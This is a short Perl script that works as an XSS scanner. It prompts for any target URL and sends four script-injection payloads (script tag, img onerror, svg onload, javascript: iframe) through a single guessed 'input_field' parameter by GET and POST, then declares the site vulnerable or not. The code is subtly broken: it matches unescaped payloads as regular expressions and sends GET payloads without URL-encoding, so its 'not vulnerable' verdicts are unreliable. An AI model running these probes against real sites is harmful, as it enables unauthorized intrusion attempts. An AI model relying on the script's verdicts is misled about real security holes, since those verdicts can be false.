#!/usr/bin/perl

use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request;
use Term::ANSIColor qw(:constants);

# Prompt for the target website URL
print "Enter your target website URL: ";
my $url = <STDIN>;
chomp $url;

# Initialize payloads for XSS injection
my @payloads = (
    "<script>alert('XSS Vulnerability');</script>",
    "<img src=x onerror=alert('XSS Vulnerability')>",
    "<svg/onload=alert('XSS Vulnerability')>",
    "<iframe src='javascript:alert(`XSS Vulnerability`)'></iframe>"
);

# Initialize UserAgent object
my $ua = LWP::UserAgent->new;

# Array to track vulnerable injection points
my @vulnerable_points;

# Function to test XSS injection
sub test_xss_injection {
    my ($target_url, $method, $payload) = @_;

    # Create request object
    my $request;
    if ($method eq "GET") {
        $request = HTTP::Request->new(GET => $target_url . "?input_field=" . $payload);
    } elsif ($method eq "POST") {
        $request = HTTP::Request->new(POST => $target_url);
        $request->content_type('application/x-www-form-urlencoded');
        $request->content("input_field=" . $payload);
    }

    # Send request
    my $response = $ua->request($request);

    # Check if the request was successful
    if ($response->is_success) {
        my $content = $response->decoded_content;

        # Check if the payload is reflected in the response
        if ($content =~ /$payload/) {
            push @vulnerable_points, "$method parameter";
        }
    } else {
        print RED, "Failed to connect to the website: " . $response->status_line . "\n", RESET;
    }
}

# Test XSS injection for each payload using both GET and POST methods
foreach my $payload (@payloads) {
    test_xss_injection($url, "GET", $payload);
    test_xss_injection($url, "POST", $payload);
}

# Print results
if (@vulnerable_points) {
    print GREEN, "The website is vulnerable to XSS injection at the following injection points: " . join(", ", @vulnerable_points) . "\n", RESET;
} else {
    print YELLOW, "The website is not vulnerable to XSS injection.\n", RESET;
}
